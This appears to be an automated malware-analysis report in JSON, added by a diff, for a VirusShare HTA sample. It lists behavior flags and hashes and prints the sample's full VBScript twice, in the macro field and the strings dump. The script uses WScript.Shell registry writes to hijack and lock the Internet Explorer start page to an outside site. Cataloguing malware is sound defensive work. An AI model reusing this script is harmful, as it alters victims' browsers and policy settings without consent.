@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<html><head>\n<hta:application id=hta_note_id\n applicationName=hta_note_name\n showInTaskBar=no\n caption=no\n innerBorder=no\n selection=no\n scroll=no\n contextmenu=no />\n<SCRIPT language=vbs>\n\nself.MoveTo 0, 0\nSet shell = CreateObject(\"WScript.Shell\")\nyer = \"Start Page\"\n  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\URL\\Prefixes\\\\mirc\",\"http://www.videolag.com\",\"REG_SZ\"\n  shell.regwrite \"HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"\n  shell.regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"\n  shell.regwrite \"HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\\"+yer+\"\", \"http://www.videolag.com\",\"REG_SZ\"\n  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\\"+yer+\"\", \"http://www.videolag.com\",\"REG_SZ\"\nself.Close\n</SCRIPT>\n</head>\n</body>\n</html>"
+    },
+    "filename": "VirusShare_4ac6940e06cdb038369a476825a1ca66",
+    "filesize": 910,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "4ac6940e06cdb038369a476825a1ca66",
+        "sha1": "b8c1f2c3f51dce73aac73abb44685c23c3dd58ec",
+        "sha256": "2ab607411609fce562d27db980d9cd6bc3ea6b2bd19db4adc5911956cd731638"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<html><head>",
+            "<hta:application id=hta_note_id",
+            " applicationName=hta_note_name",
+            " showInTaskBar=no",
+            " caption=no",
+            " innerBorder=no",
+            " selection=no",
+            " scroll=no",
+            " contextmenu=no />",
+            "<SCRIPT language=vbs>",
+            "self.MoveTo 0, 0",
+            "Set shell = CreateObject(\"WScript.Shell\")",
+            "yer = \"Start Page\"",
+            "  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\URL\\Prefixes\\\\mirc\",\"http://www.videolag.com\",\"REG_SZ\"",
+            "  shell.regwrite \"HKLM\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"",
+            "  shell.regwrite \"HKCU\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel\\\\HomePage\",\"00000001\",\"REG_DWORD\"",
+            "  shell.regwrite \"HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\\"+yer+\"\", \"http://www.videolag.com\",\"REG_SZ\"",
+            "  shell.regwrite \"HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\Main\\\\\"+yer+\"\", \"http://www.videolag.com\",\"REG_SZ\"",
+            "self.Close",
+            "</SCRIPT>",
+            "</head>",
+            "</body>",
+            "</html>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.videolag.com"
+        ]
+    },
+    "time": "0:00:00.273026",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
